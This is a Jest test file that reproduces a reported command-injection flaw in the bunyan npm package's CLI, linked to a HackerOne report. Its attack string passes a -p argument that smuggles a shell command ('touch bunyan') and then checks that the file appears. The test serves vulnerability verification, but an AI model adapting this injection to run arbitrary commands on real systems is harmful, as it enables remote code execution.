//https://hackerone.com/reports/902739
test("Remote code execution in bunyan", () => {
  const { exec } = require("child_process");
  const fs = require("fs");
  const path = "./bunyan";
  const sleep = require("sleep");

  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  let attack_string = `./node_modules/bunyan/bin/bunyan -p "S'11;touch bunyan ;'"`;

  try {
    exec(attack_string, (error, stdout) => {
      sleep.sleep(3);
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {}); //deleting the file after creation
    });
  } catch (error) {}

  //sleep.sleep(3);
  //checking that its created by after exploit.
  // file_exist = fs.existsSync(path);
  // expect(file_exist).toBe(true);

  // fs.unlink(path, function (err) {}); //deleting the file after creation
});
